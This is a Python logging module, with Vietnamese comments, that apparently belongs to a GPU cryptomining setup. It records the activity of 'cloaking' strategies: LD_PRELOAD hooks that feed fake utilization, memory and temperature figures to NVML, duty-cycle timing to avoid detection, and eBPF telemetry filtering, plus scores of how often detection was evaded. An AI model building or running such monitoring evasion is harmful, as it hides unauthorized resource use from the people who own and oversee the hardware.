"""
GPU Cloaking Logger - Detailed Logging System for GPU Cloaking Functions
Hệ thống ghi log chi tiết cho các chức năng che giấu GPU
"""
import json
import logging
import os
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, Optional, List
from functools import wraps

# LOGS_DIR configuration - thư mục lưu trữ logs
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)

class GPUCloakingLogger:
    """
    GPU Cloaking Logger - Ghi log chi tiết cho các chức năng che giấu GPU
    
    Features:
    - Cloaking strategy activation tracking (SUCCESS/FAILED/DISABLED)
    - Error details logging (chi tiết lỗi)
    - Performance metrics (thời gian thực thi, effectiveness)
    - Timestamp logging (dấu thời gian chính xác)
    - JSON structured logging format
    - Strategy effectiveness monitoring
    """
    
    def __init__(self, log_dir: str = LOGS_DIR):
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        
        # Thread-safe logging
        self._lock = threading.Lock()
        
        # Cloaking metrics storage
        self.cloaking_metrics: Dict[str, List[Dict[str, Any]]] = {}
        self.strategy_status: Dict[str, Dict[str, Any]] = {}
        
        # Setup logger
        self.logger = self._setup_logger()
        
    def _setup_logger(self) -> logging.Logger:
        """Thiết lập logger với format JSON"""
        logger = logging.getLogger('gpu_cloaking_logger')
        logger.setLevel(logging.INFO)
        
        # Clear existing handlers
        logger.handlers.clear()
        
        # Create file handler với timestamp
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_file = self.log_dir / f'gpu_cloaking_{timestamp}.log'
        
        file_handler = logging.FileHandler(log_file, encoding='utf-8')
        file_handler.setLevel(logging.INFO)
        
        # JSON formatter
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        file_handler.setFormatter(formatter)
        
        logger.addHandler(file_handler)
        
        # Console handler for development
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.DEBUG)
        console_handler.setFormatter(formatter)
        logger.addHandler(console_handler)
        
        return logger
    
    def log_cloaking_strategy(self, 
                            strategy_name: str,
                            action: str,
                            status: str,
                            execution_time: float = 0.0,
                            effectiveness_score: Optional[float] = None,
                            target_metrics: Optional[Dict[str, Any]] = None,
                            fake_metrics: Optional[Dict[str, Any]] = None,
                            error_details: Optional[str] = None,
                            additional_data: Optional[Dict[str, Any]] = None) -> None:
        """
        Log GPU cloaking strategy execution
        
        Args:
            strategy_name: Tên chiến lược cloaking (nvml_interceptor, thermal_spoofer, etc.)
            action: Hành động (INITIALIZE/START/STOP/UPDATE_METRICS)
            status: SUCCESS/FAILED/DISABLED
            execution_time: Thời gian thực thi (seconds)
            effectiveness_score: Điểm hiệu quả (0.0-1.0)
            target_metrics: Metrics thực tế cần che giấu
            fake_metrics: Metrics giả mạo được trả về
            error_details: Chi tiết lỗi (nếu có)
            additional_data: Dữ liệu bổ sung
        """
        with self._lock:
            timestamp = datetime.now().isoformat()
            
            log_entry = {
                'timestamp': timestamp,
                'strategy_name': strategy_name,
                'action': action,
                'status': status,
                'execution_time_seconds': execution_time,
                'effectiveness_score': effectiveness_score,
                'target_metrics': target_metrics or {},
                'fake_metrics': fake_metrics or {},
                'error_details': error_details,
                'additional_data': additional_data or {}
            }
            
            # Store cloaking metrics
            if strategy_name not in self.cloaking_metrics:
                self.cloaking_metrics[strategy_name] = []
            
            self.cloaking_metrics[strategy_name].append({
                'timestamp': timestamp,
                'action': action,
                'status': status,
                'execution_time': execution_time,
                'effectiveness_score': effectiveness_score
            })
            
            # Update strategy status
            self.strategy_status[strategy_name] = {
                'last_action': action,
                'last_status': status,
                'last_updated': timestamp,
                'is_active': action == 'START' and status == 'SUCCESS'
            }
            
            # Log to file với standard format
            self.logger.info(f"GPU_CLOAKING: {strategy_name} - {action} - {status} - {execution_time:.4f}s")
            
    def log_nvml_interception(self, 
                            action: str,
                            status: str,
                            fake_utilization: Optional[int] = None,
                            fake_memory: Optional[int] = None,
                            lib_path: Optional[str] = None,
                            error_details: Optional[str] = None) -> None:
        """
        Log NVML interception events
        
        Args:
            action: INITIALIZE/START/STOP/UPDATE_METRICS
            status: SUCCESS/FAILED/DISABLED
            fake_utilization: Fake GPU utilization %
            fake_memory: Fake memory usage MB
            lib_path: Path to hook library
            error_details: Chi tiết lỗi
        """
        self.log_cloaking_strategy(
            strategy_name="nvml_interceptor",
            action=action,
            status=status,
            fake_metrics={
                'gpu_utilization': fake_utilization,
                'memory_used': fake_memory
            } if fake_utilization is not None else {},
            error_details=error_details,
            additional_data={
                'lib_path': lib_path,
                'ld_preload_active': 'LD_PRELOAD' in os.environ
            }
        )
    
    def log_thermal_spoofing(self, 
                           action: str,
                           status: str,
                           fake_temperature: Optional[float] = None,
                           add_noise: Optional[bool] = None,
                           lib_path: Optional[str] = None,
                           error_details: Optional[str] = None) -> None:
        """
        Log thermal spoofing events
        
        Args:
            action: INITIALIZE/START/STOP/UPDATE_METRICS
            status: SUCCESS/FAILED/DISABLED
            fake_temperature: Fake temperature °C
            add_noise: Whether noise is added
            lib_path: Path to hook library
            error_details: Chi tiết lỗi
        """
        self.log_cloaking_strategy(
            strategy_name="thermal_spoofer",
            action=action,
            status=status,
            fake_metrics={
                'temperature': fake_temperature,
                'noise_enabled': add_noise
            } if fake_temperature is not None else {},
            error_details=error_details,
            additional_data={
                'lib_path': lib_path,
                'ld_preload_active': 'LD_PRELOAD' in os.environ
            }
        )
    
    def log_time_based_evasion(self, 
                             action: str,
                             status: str,
                             work_ms: Optional[int] = None,
                             sleep_ms: Optional[int] = None,
                             target_pid: Optional[int] = None,
                             error_details: Optional[str] = None) -> None:
        """
        Log time-based evasion events
        
        Args:
            action: INITIALIZE/START/STOP/CYCLE
            status: SUCCESS/FAILED/DISABLED
            work_ms: Work time in milliseconds
            sleep_ms: Sleep time in milliseconds
            target_pid: Target process PID
            error_details: Chi tiết lỗi
        """
        self.log_cloaking_strategy(
            strategy_name="time_based_manager",
            action=action,
            status=status,
            target_metrics={
                'work_ms': work_ms,
                'sleep_ms': sleep_ms,
                'target_pid': target_pid
            } if work_ms is not None else {},
            error_details=error_details,
            additional_data={
                'duty_cycle': f"{work_ms}ms/{sleep_ms}ms" if work_ms and sleep_ms else None
            }
        )
    
    def log_ebpf_filter(self, 
                       action: str,
                       status: str,
                       filter_mode: Optional[str] = None,
                       config_path: Optional[str] = None,
                       mock_mode: Optional[bool] = None,
                       error_details: Optional[str] = None) -> None:
        """
        Log eBPF telemetry filter events
        
        Args:
            action: INITIALIZE/START/STOP/UPDATE_RULES
            status: SUCCESS/FAILED/DISABLED
            filter_mode: Filter mode (auto/manual)
            config_path: Configuration file path
            mock_mode: Whether running in mock mode
            error_details: Chi tiết lỗi
        """
        self.log_cloaking_strategy(
            strategy_name="ebpf_telemetry_filter",
            action=action,
            status=status,
            error_details=error_details,
            additional_data={
                'filter_mode': filter_mode,
                'config_path': config_path,
                'mock_mode': mock_mode,
                'ebpf_available': True  # Will be updated based on actual availability
            }
        )
    
    def log_cloaking_effectiveness(self, 
                                 strategy_name: str,
                                 detection_attempts: int,
                                 successful_evasions: int,
                                 detection_sources: List[str],
                                 metrics_comparison: Optional[Dict[str, Any]] = None) -> None:
        """
        Log cloaking effectiveness metrics
        
        Args:
            strategy_name: Tên chiến lược
            detection_attempts: Số lần bị thử phát hiện
            successful_evasions: Số lần trốn thoát thành công
            detection_sources: Nguồn phát hiện
            metrics_comparison: So sánh metrics thực vs giả
        """
        effectiveness_score = successful_evasions / detection_attempts if detection_attempts > 0 else 1.0
        
        self.log_cloaking_strategy(
            strategy_name=strategy_name,
            action="EFFECTIVENESS_REPORT",
            status="SUCCESS",
            effectiveness_score=effectiveness_score,
            additional_data={
                'detection_attempts': detection_attempts,
                'successful_evasions': successful_evasions,
                'detection_sources': detection_sources,
                'metrics_comparison': metrics_comparison or {}
            }
        )
    
    def get_strategy_summary(self, strategy_name: str) -> Dict[str, Any]:
        """
        Lấy tổng kết cho một cloaking strategy
        
        Args:
            strategy_name: Tên strategy
            
        Returns:
            Dict chứa strategy summary
        """
        if strategy_name not in self.cloaking_metrics:
            return {}
        
        metrics = self.cloaking_metrics[strategy_name]
        if not metrics:
            return {}
        
        # Calculate statistics
        total_actions = len(metrics)
        success_actions = sum(1 for m in metrics if m['status'] == 'SUCCESS')
        failed_actions = sum(1 for m in metrics if m['status'] == 'FAILED')
        
        effectiveness_scores = [m['effectiveness_score'] for m in metrics 
                              if m['effectiveness_score'] is not None]
        
        summary = {
            'strategy_name': strategy_name,
            'total_actions': total_actions,
            'success_actions': success_actions,
            'failed_actions': failed_actions,
            'success_rate': success_actions / total_actions if total_actions > 0 else 0,
            'current_status': self.strategy_status.get(strategy_name, {}),
            'first_action': metrics[0]['timestamp'],
            'last_action': metrics[-1]['timestamp']
        }
        
        if effectiveness_scores:
            summary.update({
                'avg_effectiveness': sum(effectiveness_scores) / len(effectiveness_scores),
                'min_effectiveness': min(effectiveness_scores),
                'max_effectiveness': max(effectiveness_scores)
            })
        
        return summary
    
    def get_active_strategies(self) -> List[Dict[str, Any]]:
        """
        Lấy danh sách các strategy đang active
        
        Returns:
            List of active strategies with details
        """
        active_strategies = []
        
        for strategy_name, status in self.strategy_status.items():
            if status.get('is_active', False):
                strategy_summary = self.get_strategy_summary(strategy_name)
                active_strategies.append({
                    'strategy_name': strategy_name,
                    'status': status,
                    'summary': strategy_summary
                })
        
        return active_strategies
    
    def export_cloaking_report(self, output_file: Optional[str] = None) -> str:
        """
        Export cloaking report to standard log format
        
        Args:
            output_file: Output file path (optional)
            
        Returns:
            Path to exported file
        """
        if output_file is None:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = str(self.log_dir / f'gpu_cloaking_report_{timestamp}.log')
        
        # Write report to standard log format
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"GPU Cloaking Strategy Report - Generated at: {datetime.now().isoformat()}\n")
            f.write("=" * 80 + "\n\n")
            
            # Active strategies
            active_strategies = self.get_active_strategies()
            f.write(f"Active Strategies: {len(active_strategies)}\n\n")
            
            for strategy_name in self.cloaking_metrics:
                summary = self.get_strategy_summary(strategy_name)
                f.write(f"Strategy: {strategy_name}\n")
                f.write(f"  Total Actions: {summary.get('total_actions', 0)}\n")
                f.write(f"  Success Rate: {summary.get('success_rate', 0):.2%}\n")
                if 'avg_effectiveness' in summary:
                    f.write(f"  Avg Effectiveness: {summary['avg_effectiveness']:.2f}\n")
                f.write("\n")
        
        self.logger.info(f"Cloaking report exported to: {output_file}")
        return output_file

# Global logger instance
gpu_cloak_logger = GPUCloakingLogger()

def log_gpu_cloaking(strategy_name: str,
                    action: str = "EXECUTE",
                    measure_effectiveness: bool = True):
    """
    Decorator cho GPU cloaking functions logging
    
    Args:
        strategy_name: Tên chiến lược cloaking
        action: Hành động (INITIALIZE/START/STOP/EXECUTE)
        measure_effectiveness: Có đo effectiveness không
    """
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            function_name = f"{func.__module__}.{func.__name__}"
            start_time = time.time()
            
            try:
                # Execute function
                result = func(*args, **kwargs)
                
                # Calculate execution time
                execution_time = time.time() - start_time
                
                # Log successful execution
                gpu_cloak_logger.log_cloaking_strategy(
                    strategy_name=strategy_name,
                    action=action,
                    status="SUCCESS",
                    execution_time=execution_time,
                    additional_data={
                        'function_name': function_name,
                        'args_count': len(args),
                        'kwargs_keys': list(kwargs.keys()) if kwargs else []
                    }
                )
                
                return result
                
            except Exception as e:
                # Calculate execution time even for failures
                execution_time = time.time() - start_time
                
                # Log failed execution
                gpu_cloak_logger.log_cloaking_strategy(
                    strategy_name=strategy_name,
                    action=action,
                    status="FAILED",
                    execution_time=execution_time,
                    error_details=str(e),
                    additional_data={
                        'function_name': function_name,
                        'args_count': len(args),
                        'kwargs_keys': list(kwargs.keys()) if kwargs else []
                    }
                )
                
                # Re-raise exception
                raise
                
        return wrapper
    return decorator

# Utility functions
def log_cloaking_event(strategy_name: str,
                      event_type: str,
                      status: str,
                      details: Optional[Dict[str, Any]] = None) -> None:
    """
    Log cloaking-related events
    
    Args:
        strategy_name: Tên chiến lược cloaking
        event_type: Type of event (ACTIVATION/DEACTIVATION/METRICS_UPDATE)
        status: SUCCESS/FAILED/DISABLED
        details: Additional details
    """
    gpu_cloak_logger.log_cloaking_strategy(
        strategy_name=strategy_name,
        action=event_type,
        status=status,
        additional_data={
            'event_type': event_type,
            'details': details or {}
        }
    )